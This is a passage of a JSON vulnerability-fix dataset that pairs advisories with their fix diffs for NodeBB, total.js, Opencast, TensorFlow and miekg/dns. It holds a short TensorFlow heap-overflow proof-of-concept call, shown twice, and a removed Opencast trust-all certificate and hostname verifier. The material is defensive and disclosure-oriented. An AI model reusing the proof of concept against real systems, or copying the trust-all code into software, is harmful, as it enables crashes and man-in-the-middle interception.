'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/framework\/function.cc'])","num_files":1.0},{"index":349,"vuln_id":"GHSA-43m5-c88r-cjvv","cwe_id":"{'CWE-352'}","score":6.8,"chain":"{'https:\/\/github.com\/psychobunny\/nodebb-plugin-blog-comments\/commit\/cf43beedb05131937ef46f365ab0a0c6fa6ac618'}","dataset":"osv","summary":"XSS due to lack of CSRF validation for replying\/publishing ### Impact\nDue to lack of CSRF validation, a logged in user is potentially vulnerable to an XSS attack which could allow a third party to post on their behalf on the forum.\n\n### Patches\nUpgrade to the latest version v0.7.0\n\n### Workarounds\nYou can cherry-pick the following commit: [https:\/\/github.com\/psychobunny\/nodebb-plugin-blog-comments\/commit\/cf43beedb05131937ef46f365ab0a0c6fa6ac618](https:\/\/github.com\/psychobunny\/nodebb-plugin-blog-comments\/commit\/cf43beedb05131937ef46f365ab0a0c6fa6ac618)\n\n### References\nVisit https:\/\/community.nodebb.org if you have any questions about this issue or on how to patch \/ upgrade your instance.","published_date":"2020-08-26","chain_len":1,"project":"https:\/\/github.com\/psychobunny\/nodebb-plugin-blog-comments","commit_href":"https:\/\/github.com\/psychobunny\/nodebb-plugin-blog-comments\/commit\/cf43beedb05131937ef46f365ab0a0c6fa6ac618","commit_sha":"cf43beedb05131937ef46f365ab0a0c6fa6ac618","patch":"SINGLE","chain_ord":"['cf43beedb05131937ef46f365ab0a0c6fa6ac618']","before_first_fix_commit":"{'ed0156594a44c6429743e314e9b5a313fad60730'}","last_fix_commit":"cf43beedb05131937ef46f365ab0a0c6fa6ac618","chain_ord_pos":1.0,"commit_datetime":"08\/20\/2020, 05:11:57","message":"fix: CSRF issues","author":"psychobunny","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'library.js': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/psychobunny\/nodebb-plugin-blog-comments\/raw\/cf43beedb05131937ef46f365ab0a0c6fa6ac618\/library.js', 'patch': \"@@ -248,8 +248,8 @@\\n \\t\\t});\\n \\n \\t\\tapp.get('\/comments\/get\/:id\/:pagination?', middleware.applyCSRF, Comments.getCommentData);\\n-\\t\\tapp.post('\/comments\/reply', Comments.replyToComment);\\n-\\t\\tapp.post('\/comments\/publish', Comments.publishArticle);\\n+\\t\\tapp.post('\/comments\/reply', middleware.applyCSRF, Comments.replyToComment);\\n+\\t\\tapp.post('\/comments\/publish', middleware.applyCSRF, Comments.publishArticle);\\n \\n \\t\\tapp.get('\/admin\/blog-comments', middleware.admin.buildHeader, renderAdmin);\\n \\t\\tapp.get('\/api\/admin\/blog-comments', renderAdmin);\"}}","message_norm":"fix: csrf issues","language":"en","entities":"[('csrf', 'SECWORD', ''), ('issues', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['library.js'])","num_files":1.0},{"index":351,"vuln_id":"GHSA-4449-hg37-77v8","cwe_id":"{'CWE-78'}","score":8.6,"chain":"{'https:\/\/github.com\/totaljs\/framework\/commit\/6192491ab2631e7c1d317c221f18ea613e2c18a5'}","dataset":"osv","summary":"Command injection in total.js There is a command injection vulnerability that affects the package total.js before version 3.4.7. The issue occurs in the image.pipe and image.stream functions. The type parameter is used to build the command that is then executed using child_process.spawn. The issue occurs because child_process.spawn is called with the option shell set to true and because the type parameter is not properly sanitized.","published_date":"2021-02-05","chain_len":1,"project":"https:\/\/github.com\/totaljs\/framework","commit_href":"https:\/\/github.com\/totaljs\/framework\/commit\/6192491ab2631e7c1d317c221f18ea613e2c18a5","commit_sha":"6192491ab2631e7c1d317c221f18ea613e2c18a5","patch":"SINGLE","chain_ord":"['6192491ab2631e7c1d317c221f18ea613e2c18a5']","before_first_fix_commit":"{'79e84ada0a4455a2fe2383bed6436f231290276a'}","last_fix_commit":"6192491ab2631e7c1d317c221f18ea613e2c18a5","chain_ord_pos":1.0,"commit_datetime":"11\/27\/2020, 16:36:16","message":"Fixed \"Command Injection\" in `image.stream()` - thank to Sam Sanoop.","author":"Peter Sirka","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'image.js': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/totaljs\/framework\/raw\/6192491ab2631e7c1d317c221f18ea613e2c18a5\/image.js', 'patch': '@@ -38,6 +38,7 @@ const SPAWN_OPT = { shell: true };\\n const D = require(\\'os\\').platform().substring(0, 3).toLowerCase() === \\'win\\' ? \\'\"\\' : \\'\\\\\\'\\';\\n const CMD_CONVERT = { gm: \\'gm\\', im: \\'convert\\', magick: \\'magick\\' };\\n const CMD_CONVERT2 = { gm: \\'gm convert\\', im: \\'convert\\', magick: \\'magick\\' };\\n+const SUPPORTEDIMAGES = { jpg: 1, png: 1, gif: 1, apng: 1, jpeg: 1, heif: 1, heic: 1, webp: 1, ico: 1 };\\n \\n var CACHE = {};\\n var middlewares = {};\\n@@ -322,7 +323,7 @@ ImageProto.stream = function(type, writer) {\\n \\n \\t!self.builder.length && self.minify();\\n \\n-\\tif (!type)\\n+\\tif (!type || !SUPPORTEDIMAGES[type])\\n \\t\\ttype = self.outputType;\\n \\n \\tF.stats.performance.open++;'}}","message_norm":"fixed \"command injection\" in `image.stream()` - thank to sam sanoop.","language":"en","entities":"[('fixed', 'ACTION', ''), ('command injection', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['image.js'])","num_files":1.0},{"index":354,"vuln_id":"GHSA-44cw-p2hm-gpf6","cwe_id":"{'CWE-297'}","score":4.8,"chain":"{'https:\/\/github.com\/opencast\/opencast\/commit\/4225bf90af74557deaf8fb6b80b0705c9621acfc'}","dataset":"osv","summary":"Disabled Hostname Verification in Opencast Opencast before version 8.9 and 7.9 disables HTTPS hostname verification of its HTTP client used for a large portion of Opencast's HTTP requests.\n\nHostname verification is an important part when using HTTPS to ensure that the presented certificate is valid for the host. Disabling it can allow for man-in-the-middle attacks.\n\n### Patches\n\nThis problem is fixed in Opencast 7.9 and Opencast 8.9\n\n### Self-Signed Certificates\n\nPlease be aware that fixing the problem means that Opencast will not simply accept any self-signed certificates any longer without properly importing them. If you need those, please make sure to import them into the Java key store. Better yet, get a valid certificate e.g. from [Let's Encrypt](https:\/\/letsencrypt.org).","published_date":"2020-12-08","chain_len":1,"project":"https:\/\/github.com\/opencast\/opencast","commit_href":"https:\/\/github.com\/opencast\/opencast\/commit\/4225bf90af74557deaf8fb6b80b0705c9621acfc","commit_sha":"4225bf90af74557deaf8fb6b80b0705c9621acfc","patch":"SINGLE","chain_ord":"['4225bf90af74557deaf8fb6b80b0705c9621acfc']","before_first_fix_commit":"{'4b905437e90bd19700a6a6688f227f9efb20e153'}","last_fix_commit":"4225bf90af74557deaf8fb6b80b0705c9621acfc","chain_ord_pos":1.0,"commit_datetime":"11\/17\/2020, 17:03:36","message":"Re-Enable Hostname Verification\n\nThis patch is a minimal change to re-enable HTTPS hostname verification\nof Opencast's HTTP client used for a large portion its HTTP requests.\n\nHostname verification is an important part when using HTTPS to ensure\nthat the presented certificate is valid for the host. Disabling it can\nallow for man-in-the-middle attacks.","author":"Lars Kiesow","comments":null,"stats":"{'additions': 1, 'deletions': 136, 'total': 137}","files":"{'modules\/kernel\/src\/main\/java\/org\/opencastproject\/kernel\/http\/impl\/HttpClientImpl.java': {'additions': 1, 'deletions': 136, 'changes': 137, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/opencast\/opencast\/raw\/4225bf90af74557deaf8fb6b80b0705c9621acfc\/modules%2Fkernel%2Fsrc%2Fmain%2Fjava%2Forg%2Fopencastproject%2Fkernel%2Fhttp%2Fimpl%2FHttpClientImpl.java', 'patch': '@@ -27,28 +27,12 @@\\n import org.apache.http.client.CredentialsProvider;\\n import org.apache.http.client.methods.HttpUriRequest;\\n import org.apache.http.conn.ClientConnectionManager;\\n-import org.apache.http.conn.scheme.Scheme;\\n-import org.apache.http.conn.scheme.SchemeRegistry;\\n-import org.apache.http.conn.ssl.SSLSocketFactory;\\n-import org.apache.http.conn.ssl.X509HostnameVerifier;\\n import org.apache.http.impl.client.DefaultHttpClient;\\n import org.apache.http.params.HttpParams;\\n import org.slf4j.Logger;\\n import org.slf4j.LoggerFactory;\\n \\n import java.io.IOException;\\n-import java.security.KeyManagementException;\\n-import java.security.NoSuchAlgorithmException;\\n-import java.security.SecureRandom;\\n-import java.security.cert.CertificateException;\\n-import java.security.cert.X509Certificate;\\n-\\n-import javax.net.ssl.SSLContext;\\n-import javax.net.ssl.SSLException;\\n-import javax.net.ssl.SSLSession;\\n-import javax.net.ssl.SSLSocket;\\n-import javax.net.ssl.TrustManager;\\n-import javax.net.ssl.X509TrustManager;\\n \\n \/** Implementation of HttpClient that makes http requests. *\/\\n public class HttpClientImpl implements HttpClient {\\n@@ -57,7 +41,7 @@ public class HttpClientImpl implements HttpClient {\\n   private static final Logger logger = LoggerFactory.getLogger(HttpClientImpl.class);\\n \\n   \/** client used for all http requests. *\/\\n-  private DefaultHttpClient defaultHttpClient = makeHttpClient();\\n+  private DefaultHttpClient defaultHttpClient = new DefaultHttpClient();\\n \\n   \/** See org.opencastproject.kernel.http.api.HttpClient *\/\\n   @Override\\n@@ -83,123 +67,4 @@ public ClientConnectionManager getConnectionManager() {\\n     return defaultHttpClient.getConnectionManager();\\n   }\\n \\n-  \/**\\n-   * Creates a new client that can deal with all kinds of oddities with regards to http\/https connections.\\n-   *\\n-   * @return the client\\n-   *\/\\n-  private DefaultHttpClient makeHttpClient() {\\n-\\n-    DefaultHttpClient defaultHttpClient = new DefaultHttpClient();\\n-    try {\\n-      logger.debug(\"Installing forgiving hostname verifier and trust managers\");\\n-      X509TrustManager trustManager = createTrustManager();\\n-      X509HostnameVerifier hostNameVerifier = createHostNameVerifier();\\n-      SSLContext sslContext = SSLContext.getInstance(\"TLS\");\\n-      sslContext.init(null, new TrustManager[] { trustManager }, new SecureRandom());\\n-      SSLSocketFactory ssf = new SSLSocketFactory(sslContext, hostNameVerifier);\\n-      ClientConnectionManager ccm = defaultHttpClient.getConnectionManager();\\n-      SchemeRegistry sr = ccm.getSchemeRegistry();\\n-      sr.register(new Scheme(\"https\", 443, ssf));\\n-    } catch (NoSuchAlgorithmException e) {\\n-      logger.error(\"Error creating context to handle TLS connections: {}\", e.getMessage());\\n-    } catch (KeyManagementException e) {\\n-      logger.error(\"Error creating context to handle TLS connections: {}\", e.getMessage());\\n-    }\\n-\\n-    return defaultHttpClient;\\n-  }\\n-\\n-  \/**\\n-   * Returns a new trust manager which will be in charge of checking the SSL certificates that are being presented by\\n-   * SSL enabled hosts.\\n-   *\\n-   * @return the trust manager\\n-   *\/\\n-  private X509TrustManager createTrustManager() {\\n-    X509TrustManager trustManager = new X509TrustManager() {\\n-\\n-      \/**\\n-       * {@InheritDoc}\\n-       *\\n-       * @see javax.net.ssl.X509TrustManager#checkClientTrusted(java.security.cert.X509Certificate[], java.lang.String)\\n-       *\/\\n-      public void checkClientTrusted(X509Certificate[] xcs, String string) throws CertificateException {\\n-        logger.trace(\"Skipping trust check on client certificate {}\", string);\\n-      }\\n-\\n-      \/**\\n-       * {@InheritDoc}\\n-       *\\n-       * @see javax.net.ssl.X509TrustManager#checkServerTrusted(java.security.cert.X509Certificate[], java.lang.String)\\n-       *\/\\n-      public void checkServerTrusted(X509Certificate[] xcs, String string) throws CertificateException {\\n-        logger.trace(\"Skipping trust check on server certificate {}\", string);\\n-      }\\n-\\n-      \/**\\n-       * {@InheritDoc}\\n-       *\\n-       * @see javax.net.ssl.X509TrustManager#getAcceptedIssuers()\\n-       *\/\\n-      public X509Certificate[] getAcceptedIssuers() {\\n-        logger.trace(\"Returning empty list of accepted issuers\");\\n-        return null;\\n-      }\\n-\\n-    };\\n-\\n-    return trustManager;\\n-  }\\n-\\n-  \/**\\n-   * Creates a host name verifier that will make sure the SSL host\\'s name matches the name in the SSL certificate.\\n-   *\\n-   * @return the host name verifier\\n-   *\/\\n-  private X509HostnameVerifier createHostNameVerifier() {\\n-    X509HostnameVerifier verifier = new X509HostnameVerifier() {\\n-\\n-      \/**\\n-       * {@InheritDoc}\\n-       *\\n-       * @see org.apache.http.conn.ssl.X509HostnameVerifier#verify(java.lang.String, javax.net.ssl.SSLSocket)\\n-       *\/\\n-      public void verify(String host, SSLSocket ssl) throws IOException {\\n-        logger.trace(\"Skipping SSL host name check on {}\", host);\\n-      }\\n-\\n-      \/**\\n-       * {@InheritDoc}\\n-       *\\n-       * @see org.apache.http.conn.ssl.X509HostnameVerifier#verify(java.lang.String, java.security.cert.X509Certificate)\\n-       *\/\\n-      public void verify(String host, X509Certificate xc) throws SSLException {\\n-        logger.trace(\"Skipping X509 certificate host name check on {}\", host);\\n-      }\\n-\\n-      \/**\\n-       * {@InheritDoc}\\n-       *\\n-       * @see org.apache.http.conn.ssl.X509HostnameVerifier#verify(java.lang.String, java.lang.String[],\\n-       *      java.lang.String[])\\n-       *\/\\n-      public void verify(String host, String[] cns, String[] subjectAlts) throws SSLException {\\n-        logger.trace(\"Skipping DNS host name check on {}\", host);\\n-      }\\n-\\n-      \/**\\n-       * {@InheritDoc}\\n-       *\\n-       * @see javax.net.ssl.HostnameVerifier#verify(java.lang.String, javax.net.ssl.SSLSession)\\n-       *\/\\n-      public boolean verify(String host, SSLSession ssl) {\\n-        logger.trace(\"Skipping SSL session host name check on {}\", host);\\n-        return true;\\n-      }\\n-    };\\n-\\n-    return verifier;\\n-  }\\n-\\n }'}}","message_norm":"re-enable hostname verification\n\nthis patch is a minimal change to re-enable https hostname verification\nof opencast's http client used for a large portion its http requests.\n\nhostname verification is an important part when using https to ensure\nthat the presented certificate is valid for the host. disabling it can\nallow for man-in-the-middle attacks.","language":"en","entities":"[('hostname', 'SECWORD', ''), ('hostname', 'SECWORD', ''), ('hostname', 'SECWORD', ''), ('ensure', 'ACTION', ''), ('certificate', 'SECWORD', ''), ('man-in-the-middle', 'SECWORD', ''), ('attacks', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/kernel\/src\/main\/java\/org\/opencastproject\/kernel\/http\/impl\/HttpClientImpl.java'])","num_files":1.0},{"index":357,"vuln_id":"GHSA-44qp-9wwf-734r","cwe_id":"{'CWE-787', 'CWE-120'}","score":7.6,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2b7100d6cdff36aa21010a82269bc05a6d1cc74a', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/adbbabdb0d3abb3cdeac69e38a96de1d678b24b3'}","dataset":"osv","summary":"Heap overflow in Tensorflow ### Impact \nThe [implementation of `SparseCountSparseOutput`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5100e359aef5c8021f2e71c7b986420b85ce7b3d\/tensorflow\/core\/kernels\/count_ops.cc#L168-L273) is vulnerable to a heap overflow:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.SparseCountSparseOutput(\n  indices=[[-1,-1]],\n  values=[2],\n  dense_shape=[1, 1],\n  weights=[1],\n  binary_output=True,\n  minlength=-1,\n  maxlength=-1,\n  name=None)\n```\n\n### Patches\nWe have patched the issue in GitHub commits [2b7100d6cdff36aa21010a82269bc05a6d1cc74a](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2b7100d6cdff36aa21010a82269bc05a6d1cc74a) and [adbbabdb0d3abb3cdeac69e38a96de1d678b24b3](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/adbbabdb0d3abb3cdeac69e38a96de1d678b24b3).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.","published_date":"2022-02-09","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2b7100d6cdff36aa21010a82269bc05a6d1cc74a","commit_sha":"2b7100d6cdff36aa21010a82269bc05a6d1cc74a","patch":"MULTI","chain_ord":"['2b7100d6cdff36aa21010a82269bc05a6d1cc74a', 'adbbabdb0d3abb3cdeac69e38a96de1d678b24b3']","before_first_fix_commit":"{'2b7100d6cdff36aa21010a82269bc05a6d1cc74a'}","last_fix_commit":"adbbabdb0d3abb3cdeac69e38a96de1d678b24b3","chain_ord_pos":1.0,"commit_datetime":"12\/08\/2021, 03:36:18","message":"Cleanup and remove duplicate validation in `SparseCount`.\n\nWe have valdiation that is duplicated, checking different conditions, in different formats and failing to capture all cases. This should fix all the previous bugs.\n\nPiperOrigin-RevId: 414886981\nChange-Id: Ibf0bba0beb057b76d505324bb9487565daf95f01","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 21, 'deletions': 27, 'total': 48}","files":"{'tensorflow\/core\/kernels\/count_ops.cc': {'additions': 21, 'deletions': 27, 'changes': 48, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/2b7100d6cdff36aa21010a82269bc05a6d1cc74a\/tensorflow%2Fcore%2Fkernels%2Fcount_ops.cc', 'patch': '@@ -185,6 +185,27 @@ class SparseCount : public OpKernel {\\n                 errors::InvalidArgument(\\n                     \"Input indices must be a 2-dimensional tensor. Got: \",\\n                     indices.shape().DebugString()));\\n+    OP_REQUIRES(context, TensorShapeUtils::IsVector(values.shape()),\\n+                errors::InvalidArgument(\"Input values must be a vector. Got: \",\\n+                                        values.shape().DebugString()));\\n+    OP_REQUIRES(context, TensorShapeUtils::IsVector(shape.shape()),\\n+                errors::InvalidArgument(\"Input shape must be a vector. Got: \",\\n+                                        shape.shape().DebugString()));\\n+    OP_REQUIRES(context,\\n+                values.shape().dim_size(0) == indices.shape().dim_size(0),\\n+                errors::InvalidArgument(\\n+                    \"Number of values must match first dimension of indices.\",\\n+                    \"Got \", values.shape().dim_size(0),\\n+                    \" values, indices shape: \", indices.shape().DebugString()));\\n+    OP_REQUIRES(\\n+        context, shape.shape().dim_size(0) == indices.shape().dim_size(1),\\n+        errors::InvalidArgument(\\n+            \"Number of dimensions must match second dimension of indices.\",\\n+            \"Got \", shape.shape().dim_size(0),\\n+            \" dimensions, indices shape: \", indices.shape().DebugString()));\\n+    OP_REQUIRES(context, shape.NumElements() > 0,\\n+                errors::InvalidArgument(\\n+                    \"The shape argument requires at least one element.\"));\\n \\n     if (use_weights) {\\n       OP_REQUIRES(\\n@@ -195,28 +216,11 @@ class SparseCount : public OpKernel {\\n               \"; values shape: \", values.shape().DebugString()));\\n     }\\n \\n-    OP_REQUIRES(context, shape.NumElements() != 0,\\n-                errors::InvalidArgument(\\n-                    \"The shape argument requires at least one element.\"));\\n-\\n     bool is_1d = shape.NumElements() == 1;\\n     auto shape_vector = shape.flat<int64_t>();\\n     int num_batches = is_1d ? 1 : shape_vector(0);\\n     int num_values = values.NumElements();\\n \\n-    for (int b = 0; b < shape_vector.size(); b++) {\\n-      OP_REQUIRES(context, shape_vector(b) >= 0,\\n-                  errors::InvalidArgument(\\n-                      \"Elements in dense_shape must be >= 0. Instead got:\",\\n-                      shape.DebugString()));\\n-    }\\n-\\n-    OP_REQUIRES(context, num_values == indices.shape().dim_size(0),\\n-                errors::InvalidArgument(\\n-                    \"Number of values must match first dimension of indices.\",\\n-                    \"Got \", num_values,\\n-                    \" values, indices shape: \", indices.shape().DebugString()));\\n-\\n     const auto indices_values = indices.matrix<int64_t>();\\n     const auto values_values = values.flat<T>();\\n     const auto weight_values = weights.flat<W>();\\n@@ -225,16 +229,6 @@ class SparseCount : public OpKernel {\\n \\n     T max_value = 0;\\n \\n-    OP_REQUIRES(context, num_values <= indices.shape().dim_size(0),\\n-                errors::InvalidArgument(\\n-                    \"The first dimension of indices must be equal to or \"\\n-                    \"greather than number of values. ( \",\\n-                    indices.shape().dim_size(0), \" vs. \", num_values, \" )\"));\\n-    OP_REQUIRES(context, indices.shape().dim_size(1) > 0,\\n-                errors::InvalidArgument(\"The second dimension of indices must \"\\n-                                        \"be greater than 0. Received: \",\\n-                                        indices.shape().dim_size(1)));\\n-\\n     for (int idx = 0; idx < num_values; ++idx) {\\n       int batch = is_1d ? 0 : indices_values(idx, 0);\\n       if (batch >= num_batches) {'}}","message_norm":"cleanup and remove duplicate validation in `sparsecount`.\n\nwe have valdiation that is duplicated, checking different conditions, in different formats and failing to capture all cases. this should fix all the previous bugs.\n\npiperorigin-revid: 414886981\nchange-id: ibf0bba0beb057b76d505324bb9487565daf95f01","language":"en","entities":"[('remove', 'ACTION', ''), ('duplicate validation', 'SECWORD', ''), ('fix', 'ACTION', ''), ('bugs', 'FLAW', ''), ('414886981', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/count_ops.cc'])","num_files":1.0},{"index":358,"vuln_id":"GHSA-44qp-9wwf-734r","cwe_id":"{'CWE-787', 'CWE-120'}","score":7.6,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2b7100d6cdff36aa21010a82269bc05a6d1cc74a', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/adbbabdb0d3abb3cdeac69e38a96de1d678b24b3'}","dataset":"osv","summary":"Heap overflow in Tensorflow ### Impact \nThe [implementation of `SparseCountSparseOutput`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5100e359aef5c8021f2e71c7b986420b85ce7b3d\/tensorflow\/core\/kernels\/count_ops.cc#L168-L273) is vulnerable to a heap overflow:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.SparseCountSparseOutput(\n  indices=[[-1,-1]],\n  values=[2],\n  dense_shape=[1, 1],\n  weights=[1],\n  binary_output=True,\n  minlength=-1,\n  maxlength=-1,\n  name=None)\n```\n\n### Patches\nWe have patched the issue in GitHub commits [2b7100d6cdff36aa21010a82269bc05a6d1cc74a](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2b7100d6cdff36aa21010a82269bc05a6d1cc74a) and [adbbabdb0d3abb3cdeac69e38a96de1d678b24b3](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/adbbabdb0d3abb3cdeac69e38a96de1d678b24b3).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.","published_date":"2022-02-09","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/adbbabdb0d3abb3cdeac69e38a96de1d678b24b3","commit_sha":"adbbabdb0d3abb3cdeac69e38a96de1d678b24b3","patch":"MULTI","chain_ord":"['2b7100d6cdff36aa21010a82269bc05a6d1cc74a', 'adbbabdb0d3abb3cdeac69e38a96de1d678b24b3']","before_first_fix_commit":"{'2b7100d6cdff36aa21010a82269bc05a6d1cc74a'}","last_fix_commit":"adbbabdb0d3abb3cdeac69e38a96de1d678b24b3","chain_ord_pos":2.0,"commit_datetime":"12\/08\/2021, 03:44:33","message":"Further validate sparse tensor for `SparseCount`: indices must be valid within dense shape.\n\nPiperOrigin-RevId: 414888122\nChange-Id: I4552bd74c135ecd4bcb5448acc0a3ce9402d8286","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 17, 'deletions': 3, 'total': 20}","files":"{'tensorflow\/core\/kernels\/count_ops.cc': {'additions': 17, 'deletions': 3, 'changes': 20, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/adbbabdb0d3abb3cdeac69e38a96de1d678b24b3\/tensorflow%2Fcore%2Fkernels%2Fcount_ops.cc', 'patch': '@@ -206,6 +206,23 @@ class SparseCount : public OpKernel {\\n     OP_REQUIRES(context, shape.NumElements() > 0,\\n                 errors::InvalidArgument(\\n                     \"The shape argument requires at least one element.\"));\\n+    \/\/ Validate indices: each index must be valid for the corresponding\\n+    \/\/ dimension. This could be possibly done better.\\n+    const auto indices_values = indices.matrix<int64_t>();\\n+    const auto shape_vector = shape.vec<int64_t>();\\n+    int num_values = values.NumElements();  \/\/ same as first dim of indices\\n+    int rank = indices.shape().dim_size(1);\\n+    for (int i = 0; i < num_values; ++i) {\\n+      for (int j = 0; j < rank; ++j) {\\n+        OP_REQUIRES(\\n+            context,\\n+            indices_values(i, j) >= 0 && indices_values(i, j) < shape_vector(j),\\n+            errors::InvalidArgument(\\n+                \"Invalid index value at \", i, \": dimension \", j, \" has value \",\\n+                indices_values(i, j), \" which is not in [0, \", shape_vector(j),\\n+                \") (as given by dense shape \", shape.DebugString()));\\n+      }\\n+    }\\n \\n     if (use_weights) {\\n       OP_REQUIRES(\\n@@ -217,11 +234,8 @@ class SparseCount : public OpKernel {\\n     }\\n \\n     bool is_1d = shape.NumElements() == 1;\\n-    auto shape_vector = shape.flat<int64_t>();\\n     int num_batches = is_1d ? 1 : shape_vector(0);\\n-    int num_values = values.NumElements();\\n \\n-    const auto indices_values = indices.matrix<int64_t>();\\n     const auto values_values = values.flat<T>();\\n     const auto weight_values = weights.flat<W>();'}}","message_norm":"further validate sparse tensor for `sparsecount`: indices must be valid within dense shape.\n\npiperorigin-revid: 414888122\nchange-id: i4552bd74c135ecd4bcb5448acc0a3ce9402d8286","language":"en","entities":"[('validate', 'ACTION', ''), ('414888122', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/count_ops.cc'])","num_files":1.0},{"index":359,"vuln_id":"GHSA-44r7-7p62-q3fr","cwe_id":"{'CWE-330', 'CWE-338'}","score":5.9,"chain":"{'https:\/\/github.com\/miekg\/dns\/commit\/8ebf2e419df7857ac8919baa05248789a8ffbf33'}","dataset":"osv","summary":"Insecure generation of random numbers The miekg Go DNS package before 1.1.25, as used in CoreDNS before 1.6.6 and other products, improperly generates random numbers because math\/rand is used. The TXID becomes predictable, leading to response forgeries.","published_date":"2021-05-18","chain_len":1,"project":"https:\/\/github.com\/miekg\/dns","commit_href":"https:\/\/github.com\/miekg\/dns\/commit\/8ebf2e419df7857ac8919baa05248789a8ffbf33","commit_sha":"8ebf2e419df7857ac8919baa05248789a8ffbf33","patch":"SINGLE","chain_ord":"['8ebf2e419df7857ac8919baa05248789a8ffbf33']","before_first_fix_commit":"{'6d0449f98180253901e9551a10ce679f35ff05be'}","last_fix_commit":"8ebf2e419df7857ac8919baa05248789a8ffbf33","chain_ord_pos":1.0,"commit_datetime":"12\/11\/2019, 07:31:09","message":"Use crypto\/rand for random id generation. (#1044)\n\n* Use crypto\/rand for random id generation.\r\n\r\nFixes #1043 and #1037\r\n\r\n* Panic on rare crypto\/rand error.\r\n\r\n* Fixes in response to review.","author":"Jacob Hoffman-Andrews","comments":null,"stats":"{'additions': 10, 'deletions': 42, 'total': 52}","files":"{'msg.go': {'additions': 10, 'deletions': 42, 'changes': 52, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/miekg\/dns\/raw\/8ebf2e419df7857ac8919baa05248789a8ffbf33\/msg.go', 'patch': '@@ -11,14 +11,12 @@ package dns\\n \/\/go:generate go run msg_generate.go\\n \\n import (\\n-\\tcrand \"crypto\/rand\"\\n+\\t\"crypto\/rand\"\\n \\t\"encoding\/binary\"\\n \\t\"fmt\"\\n \\t\"math\/big\"\\n-\\t\"math\/rand\"\\n \\t\"strconv\"\\n \\t\"strings\"\\n-\\t\"sync\"\\n )\\n \\n const (\\n@@ -73,53 +71,23 @@ var (\\n \\tErrTime          error = &Error{err: \"bad time\"}      \/\/ ErrTime indicates a timing error in TSIG authentication.\\n )\\n \\n-\/\/ Id by default, returns a 16 bits random number to be used as a\\n-\/\/ message id. The random provided should be good enough. This being a\\n-\/\/ variable the function can be reassigned to a custom function.\\n-\/\/ For instance, to make it return a static value:\\n+\/\/ Id by default returns a 16-bit random number to be used as a message id. The\\n+\/\/ number is drawn from a cryptographically secure random number generator.\\n+\/\/ This being a variable the function can be reassigned to a custom function.\\n+\/\/ For instance, to make it return a static value for testing:\\n \/\/\\n \/\/\\tdns.Id = func() uint16 { return 3 }\\n var Id = id\\n \\n-var (\\n-\\tidLock sync.Mutex\\n-\\tidRand *rand.Rand\\n-)\\n-\\n \/\/ id returns a 16 bits random number to be used as a\\n \/\/ message id. The random provided should be good enough.\\n func id() uint16 {\\n-\\tidLock.Lock()\\n-\\n-\\tif idRand == nil {\\n-\\t\\t\/\/ This (partially) works around\\n-\\t\\t\/\/ https:\/\/github.com\/golang\/go\/issues\/11833 by only\\n-\\t\\t\/\/ seeding idRand upon the first call to id.\\n-\\n-\\t\\tvar seed int64\\n-\\t\\tvar buf [8]byte\\n-\\n-\\t\\tif _, err := crand.Read(buf[:]); err == nil {\\n-\\t\\t\\tseed = int64(binary.LittleEndian.Uint64(buf[:]))\\n-\\t\\t} else {\\n-\\t\\t\\tseed = rand.Int63()\\n-\\t\\t}\\n-\\n-\\t\\tidRand = rand.New(rand.NewSource(seed))\\n+\\tvar output uint16\\n+\\terr := binary.Read(rand.Reader, binary.BigEndian, &output)\\n+\\tif err != nil {\\n+\\t\\tpanic(\"dns: reading random id failed: \" + err.Error())\\n 